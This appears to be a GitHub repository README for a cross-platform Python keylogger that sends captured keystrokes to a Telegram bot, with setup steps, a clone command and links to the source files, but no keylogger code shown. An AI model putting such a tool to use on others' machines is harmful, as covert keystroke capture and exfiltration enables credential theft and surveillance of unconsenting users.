# Telegram Keylogger
**Language:** Python
**Stars:** 5

## README
**A cross-platform (Windows/Linux) keylogger written in Python, which detects keystrokes (including correct capitalization) and sends the logs to a Telegram bot periodically.**

> This project is for educational purposes only. Malicious use of this code is illegal Use it at your own risk and only on systems that you control or have permission to monitor.

## Features
- Real-time keystroke logging.
- Shift and Caps Lock case detection.
- Automatic sending of logs via Telegram.
- Compatible with Windows and Linux.
- Clean, structured and extensible code.

## Usage

Open your `main.py` file and edit the following lines with your actual bot credentials:

```py
BOT_TOKEN = "Your_Telegram_Bot_Token"
CHAT_ID = "Your_Chat_Id"
```
- Replace `"Your_Telegram_Bot_Token"` with the token you received from BotFather.

- Replace `"Your_Chat_Id"` with the chat ID you obtained using the getUpdates method.

```shell
git clone https://github.com/ch4rum/Keylogger.git
cd Keylogger/Python
```

## Files

**Raw:** https://raw.githubusercontent.com/ch4rum/Keylogger/refs/heads/master/README.md
**Raw:** https://raw.githubusercontent.com/ch4rum/Keylogger/refs/heads/master/Python/main.py
**Raw:** https://raw.githubusercontent.com/ch4rum/Keylogger/refs/heads/master/Python/Keylogger.py